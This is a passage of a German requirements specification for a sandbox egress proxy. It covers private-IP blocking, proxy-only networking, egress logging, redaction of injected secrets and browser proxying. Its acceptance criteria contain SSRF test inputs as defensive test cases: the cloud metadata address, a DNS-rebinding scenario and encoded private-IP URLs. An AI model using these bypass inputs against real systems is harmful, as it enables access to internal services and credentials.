- **Akzeptanzkriterien:**
  - [ ] AC1 — Mit Regel `* metadata.test/**` und Test-Resolver `metadata.test → 169.254.169.254` wird der Request abgelehnt (`private_destination`).
  - [ ] AC2 — DNS-Rebinding-Test: Resolver liefert für `rebind.test` abwechselnd `93.184.216.34` und `127.0.0.1`; keine Verbindung zu `127.0.0.1` kommt zustande.
  - [ ] AC3 — `http://[::ffff:10.0.0.1]/` und `http://2130706433/` werden abgelehnt.
  - [ ] AC4 — Mit `egress_allow_private: ["10.0.0.5:5432"]` ist genau dieses Ziel erreichbar, `10.0.0.5:22` nicht.
- **Abhängigkeiten:** PRX-001

### PRX-008 — Erzwingung „Netz nur zum Proxy“ & Toolchain-Integration
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Die OS-Sandbox lässt ausschließlich Verbindungen zum Proxy zu: Linux über leeren Net-NS + Relay (SBX-008), macOS über SBPL-Netzregel auf `localhost:<port>` (SBX-007), Docker über `--network none`/internes Netz (SBX-015); Windows Beta siehe SBX-016. In die Sandbox werden Proxy- und CA-Variablen gesetzt, damit gängige Toolchains den Proxy nutzen und der beton-CA vertrauen.
- **Details:** Linux: Der Relay der Sandbox lauscht im leeren Net-NS auf demselben Port wie der Proxy, die Proxy-URL ist innen und außen gleich (SBX-008). Gesetzt: `HTTP_PROXY`, `HTTPS_PROXY`, `ALL_PROXY` (+ Kleinschreibung) mit der Proxy-URL der Stufe, `NO_PROXY` (Linux/Docker: `localhost,127.0.0.1,::1` — Loopback ist sandbox-lokal; macOS: leer, mit `dev_ports` ebenfalls Loopback, alle anderen Ports sperrt Seatbelt), `SSL_CERT_FILE`, `REQUESTS_CA_BUNDLE`, `CURL_CA_BUNDLE`, `NODE_EXTRA_CA_CERTS`, `NODE_USE_ENV_PROXY=1` (verifiziert mit Node 24), `GIT_SSL_CAINFO`, `PIP_CERT`, `CARGO_HTTP_CAINFO`, `AWS_CA_BUNDLE`, `DENO_CERT`, unter macOS `PIP_USE_DEPRECATED=legacy-certs` (pip ≥ 24.2 prüft dort sonst mit `truststore` gegen den Trust-Store des Systems); `SSL_CERT_DIR` wird entfernt. Das CA-Bundle (beton-CA plus System-Roots) liegt im privaten Verzeichnis der Session und ist in beiden Stufen lesbar. Bekannte Lücken (dokumentiert, scheitern **geschlossen** mit TLS-Fehler): Go-Binaries auf macOS (System-Verifier), Java ohne Truststore-Konfiguration, pip < 24.2 unter macOS mit `truststore`, Node < 24 ignoriert die Proxy-Variablen bei `fetch` (Verbindungsfehler).
  *Entscheidung zu #210 (Dev-Server):* Sicherheit vor Bequemlichkeit — ein Dev-Server braucht die ausdrückliche Freigabe `sandbox.dev_ports`. Linux: Landlock (ABI ≥ 4) erlaubt `bind` nur auf diesen Ports und `connect` zum Relay-Port und zu ihnen; der leere Net-NS hält sie sandbox-lokal, ein Host-Dienst auf `127.0.0.1` bleibt unerreichbar. Ohne `dev_ports` scheitert schon `bind`. macOS: Seatbelt erlaubt `bind`, `listen` und Verbindungen nur auf `localhost:<dev_port>`; das ist das Loopback des Hosts (Restrisiko, siehe Bedrohungsmodell).
- **Akzeptanzkriterien:**
  - [ ] AC1 — `curl`, `git`, `npm`, `pip`, `cargo` und Node-`fetch` erreichen über Regeln erlaubte Hosts in Stufe 2 ohne weitere Konfiguration (Integrationstest je Tool).
  - [ ] AC2 — Ein Tool, das Proxy-Variablen ignoriert und direkt verbindet, scheitert auf macOS und Linux (Escape-Test).
  - [ ] AC3 — Auf Linux erreicht ein Tool mit `sandbox.dev_ports: [3000]` einen in derselben Sandbox gestarteten Dev-Server auf `127.0.0.1:3000`, aber keinen Host-Dienst auf `127.0.0.1`; ohne `dev_ports` scheitert schon `bind` (#210).
- **Abhängigkeiten:** SBX-007, SBX-008, PRX-002

### PRX-009 — Logging, Events & Audit des Egress
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Jede Proxy-Entscheidung wird strukturiert geloggt (`tracing`): Session, Stufe, Methode, Host, Port, Pfad (ohne Query, max. 256 Zeichen), Entscheidung, auslösende Regel, Binding-Name, Status, Bytes, Dauer — nie Header-Werte oder Bodies. Denies erzeugen Events `egress.blocked`; erlaubter Verkehr wird minütlich als `egress.summary` (Host → Requests, Bytes) aggregiert; Credential-Nutzung geht ins Audit-Log (SEC-012, siehe 05-security-identity.md).
  *Umsetzung (M2):* Jede Ablehnung einer Instanz (Regel, Methode, Private-IP, SNI, ungültiger Pfad, Credential-Fehlgebrauch, CONNECT ohne Regel) geht als `egress.blocked` mit `source` (`harness`/`tools`) und Pfad ohne Query (höchstens 256 Zeichen) ins Session-Log; `tool_call_id` bleibt leer, bis der Proxy Requests einem Tool-Call zuordnen kann. Logs nennen statt eingesetzter Werte nur den geprüften Pfad mit Platzhaltern und die Namen der Bindings. Alle Instanzen einer Session zählen in einen gemeinsamen Zähler (Requests, Bytes der Request- und Antwort-Bodies), den der Runner höchstens einmal je Minute und nur bei Verkehr als `egress.summary` meldet. `GET /v1/audit?kind=credential` bzw. `beton audit list --kind credential` zeigt `credential.used` und `credential.misuse` (Filter auf `target_kind`).
- **Akzeptanzkriterien:**
  - [ ] AC1 — Ein abgelehnter Request erzeugt ein `egress.blocked {method, host, path, reason, rule_hint, tool_call_id?}` im Session-Log.
  - [ ] AC2 — Weder Logs noch Events enthalten `Authorization`-, `Cookie`- oder Query-Werte (Test mit markierten Werten + Grep).
  - [ ] AC3 — `egress.summary` erscheint höchstens einmal pro Minute und Session und nur bei Verkehr.
  - [ ] AC4 — Audit-Einträge zur Credential-Nutzung sind über `beton audit list --kind credential` abrufbar.
- **Abhängigkeiten:** PRX-001, PROTO-002 (siehe 06-data-sync-protocol.md), SEC-012 (siehe 05-security-identity.md)

### PRX-010 — Antwort-Redaction echter Secret-Werte
- **Meilenstein:** M2 · **Priorität:** Should
- **Beschreibung:** Spiegelt ein Upstream einen injizierten Wert zurück (z. B. Debug-Endpunkte, Fehlermeldungen), ersetzt der Proxy ihn in Antwort-Headern und in textartigen Bodies (`text/*`, `application/json`, `application/xml`; bis 1 MiB, unkomprimiert oder gzip/br transparent) durch den Platzhalter, damit der echte Wert nie in die Sandbox gelangt.
  *Umsetzung (M2):* Nur Antworten auf Requests mit eingesetztem Wert; gesucht wird der Wert (ab 8 Byte) roh und in JSON-Escape-Form. Header immer; Bodies mit `text/*`, `application/json`, `application/xml`, `…+json`, `…+xml`: unkomprimiert im Strom mit einem Überhang von höchstens der Länge des Werts (keine Pufferung, `Content-Length` entfällt), nach 1 MiB unverändert weiter; gzip/br bis 1 MiB gepuffert, dekodiert, redigiert und unkomprimiert ausgeliefert, größer oder nicht dekodierbar unverändert. *Restrisiko (dokumentiert):* Binäre Bodies, bekannte Längen über 1 MiB, Teile jenseits von 1 MiB und andere Kodierungen des Werts (z. B. Base64) werden nicht ersetzt.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Ein Test-Upstream, der den `Authorization`-Header im JSON-Body echot, liefert in der Sandbox nur den Platzhalter.
  - [ ] AC2 — Binäre oder > 1 MiB große Bodies werden unverändert gestreamt (keine Pufferung), dokumentiert als Restrisiko.
- **Abhängigkeiten:** PRX-006

### PRX-011 — Browser-Traffic über den Proxy
- **Meilenstein:** M3 · **Priorität:** Must
- **Beschreibung:** Der eingebettete Chromium (BRW-003, siehe 09-browser.md) läuft mit eigener Proxy-Identität und eigenen Regeln (`sandbox.browser.egress_rules`, Default = Stufe-2-Regeln). Start mit `--proxy-server`, `--proxy-bypass-list=<-loopback>` (auch Loopback über den Proxy), `--ignore-certificate-errors-spki-list=<SPKI des Instanz-Leaf-Schlüssels>`, `--disable-quic` und WebRTC-Policy `disable_non_proxied_udp`; Proxy-Authentifizierung beantwortet beton über CDP `Fetch.authRequired`. Navigations-Policies (POL-020, BRW-019) greifen zusätzlich. PRX-011 ist Owner der Proxy-Anbindung des Browsers (Proxy-Identität, Start-Flags, Zertifikatsvertrauen); BRW-018 beschreibt die Browser-Sicht.
- **Akzeptanzkriterien:**
  - [ ] AC1 — Navigation zu einer Seite ohne passende Regel zeigt eine beton-Fehlerseite (403), und ein `egress.blocked` mit `source: browser` wird geloggt.
  - [ ] AC2 — Eine Seite, die per `fetch` oder WebRTC `169.254.169.254` bzw. einen LAN-Host ansprechen will, scheitert.
  - [ ] AC3 — Chromium akzeptiert keine Zertifikate außer denen der Proxy-Instanz (Test: direkte Verbindung mit fremdem selbstsigniertem Zertifikat scheitert).
- **Abhängigkeiten:** PRX-002, PRX-007, BRW-003, BRW-018 (siehe 09-browser.md)

## Nicht in v1

- **SaaS-Sandbox-Provider** (E2B, Daytona, Modal, Fly) — v2.
- **MicroVMs** als Sandbox-/Runner-Provider — v2 (Community).
